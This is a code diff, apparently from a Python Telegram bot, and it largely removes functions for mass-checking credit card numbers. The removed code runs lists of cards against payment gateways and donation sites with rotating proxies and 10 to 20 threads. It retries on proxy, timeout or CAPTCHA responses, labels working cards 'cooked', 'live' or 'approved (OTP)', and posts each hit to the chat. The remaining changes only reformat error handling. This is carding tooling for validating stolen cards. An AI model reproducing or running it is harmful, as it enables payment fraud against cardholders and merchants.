-                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
-                        attempts += 1; continue
-
-                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway, 'price': site.get('price', '0'), 'site_url': site['url']}
-                except: attempts += 1
-            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}
-
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            futures = {executor.submit(worker, cc): cc for cc in ccs}
-            for future in as_completed(futures):
-                processed += 1
-                res = future.result()
-
-                if res['status'] == 'APPROVED':
-                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
-                        results['cooked'].append(res)
-                        update_stats_func('COOKED', True)
-                        send_hit(bot, message.chat.id, res, "🔥 COOKED")
-                    else:
-                        results['approved'].append(res)
-                        update_stats_func('APPROVED', True)
-                        send_hit(bot, message.chat.id, res, "✅ APPROVED")
-                elif res['status'] == 'APPROVED_OTP':
-                    results['approved'].append(res)
-                    update_stats_func('APPROVED_OTP', True)
-                    send_hit(bot, message.chat.id, res, "✅ APPROVED (OTP)")
-                elif res['status'] == 'DECLINED':
-                    results['declined'].append(res)
-                    update_stats_func('DECLINED', True)
-                else:
-                    results['error'].append(res)
-
-                if time.time() - last_update_time > 3 or processed == total:
-                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
-                    last_update_time = time.time()
-
-        duration = time.time() - start_time
-        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)
-
-    def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
-        total = len(ccs)
-        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
-
-        try:
-            status_msg = bot.send_message(
-                message.chat.id,
-                f"🔥 <b>{gate_name} Started...</b>\n"
-                f"💳 Cards: {total}\n"
-                f"🔌 Proxies: {len(proxies)}",
-                parse_mode='HTML'
-            )
-        except:
-            status_msg = bot.send_message(message.chat.id, f"🔥 <b>{gate_name} Started...</b>", parse_mode='HTML')
-
-        processed = 0
-        start_time = time.time()
-        last_update = time.time()
-
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = {}
-            for cc in ccs:
-                proxy = random.choice(proxies)
-                futures[executor.submit(gate_func, cc, proxy)] = cc
-
-            for future in as_completed(futures):
-                cc = futures[future]
-                processed += 1
-
-                try:
-                    response_text, status = future.result()
-
-                    res_obj = {
-                        'cc': cc,
-                        'response': response_text,
-                        'status': status,
-                        'gateway': gate_name,
-                        'price': 'N/A',
-                        'site_url': 'API'
-                    }
-
-                    if status == 'APPROVED':
-                        results['cooked'].append(res_obj)
-                        send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} HIT")
-                    elif status == 'APPROVED_OTP':
-                        results['approved'].append(res_obj)
-                        send_hit(bot, message.chat.id, res_obj, f"⚠️ {gate_name} AUTH")
-                    elif status == 'DECLINED':
-                        results['declined'].append(res_obj)
-                    else:
-                        results['error'].append(res_obj)
-
-                    if time.time() - last_update > 3:
-                        msg = (
-                            f"⚡ <b>{gate_name} Checking...</b>\n"
-                            f"{create_progress_bar(processed, total)}\n"
-                            f"<b>Progress:</b> {processed}/{total}\n"
-                            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
-                            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
-                            f"⚠️ <b>Error:</b> {len(results['error'])}"
-                        )
-                        try:
-                            bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
-                            last_update = time.time()
-                        except: pass
-
-                except Exception as e:
-                    print(f"Check Error for {cc}: {e}")
-                    results['error'].append({'cc': cc, 'response': str(e), 'status': 'ERROR'})
-
-        duration = time.time() - start_time
-        final_msg = (
-            f"✅ <b>{gate_name} Completed</b>\n"
-            f"━━━━━━━━━━━━━━━━\n"
-            f"💳 <b>Total:</b> {total}\n"
-            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
-            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
-            f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
-            f"⏱️ <b>Time:</b> {duration:.2f}s"
-        )
-
-        try:
-            bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
-        except:
-            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')
-
     # ============================================================================
     # 📩 MESSAGING
     # ============================================================================
@@ -964,7 +994,8 @@ def test_donation_site_like_script(site_url, pk, cc, proxy=None):
 ━━━━━━━━━━━━━━━━━━━━
 """
             bot.send_message(chat_id, msg, parse_mode='HTML')
-        except: pass
+        except:
+            pass
 
     def update_ui(bot, chat_id, mid, processed, total, results):
         try:
@@ -980,7 +1011,8 @@ def test_donation_site_like_script(site_url, pk, cc, proxy=None):
 ⚠️ <b>Errors:</b> {len(results['error'])}
 """
             bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
-        except: pass
+        except:
+            pass
 
     def send_final(bot, chat_id, mid, total, results, duration):
         msg = f"""
@@ -992,10 +1024,7 @@ def test_donation_site_like_script(site_url, pk, cc, proxy=None):
 ❌ <b>Declined:</b> {len(results['declined'])}
 <b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
 """
-        try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
-
-        except: bot.send_message(chat_id, msg, parse_mode='HTML')
-
-
-
-
+        try:
+            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
+        except:
+            bot.send_message(chat_id, msg, parse_mode='HTML')
